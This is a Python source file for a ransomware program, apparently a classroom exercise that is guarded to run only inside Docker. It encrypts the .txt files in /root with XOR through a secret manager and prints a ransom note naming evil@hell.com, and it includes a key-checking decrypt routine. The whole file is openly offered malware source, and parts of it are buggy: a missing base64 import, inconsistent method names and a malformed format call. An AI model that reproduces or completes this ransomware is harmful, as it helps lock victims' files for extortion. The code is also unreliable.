import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        
        # return all files matching the filter
        # example: get_files("*.txt") will return all txt files
        return list(Path("/root").glob(filter))


    def encrypt(self):
        # main function for encrypting (see PDF)
        FILES = self.get_files("*.txt")
        secret_manager = SecretManager()# create secret manager
        secret_manager.setup()# setup secret manager
        secret_manager.xor_files(FILES)# xor files

        TOKEN = secret_manager.get_hex_token()# get token
        MESSAGE_CONTACT=ENCRYPT_MESSAGE.format(TOKEN.hex())# create message
        print(MESSAGE_CONTACT)# print message

    def decrypt(self):
        # main function for decrypting (see PDF)
        # main function for decrypting 
        #ask the user the base64 key
        key=base64.b64decode(input("Enter key: "))#decode the key
        FILES=self.get_files("*.txt")#get all txt files
        secret_manager=SecretManager()
        if(secret_manager.check_key(key)):#check if the key is correct
            secret_manager.set_key(key)#set the key
            secret_manager.xorfiles(FILES,key)#xor the files
            print("Your files have been decrypted")
        else:
            print("Wrong key")
            sys.exit(1)

      


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
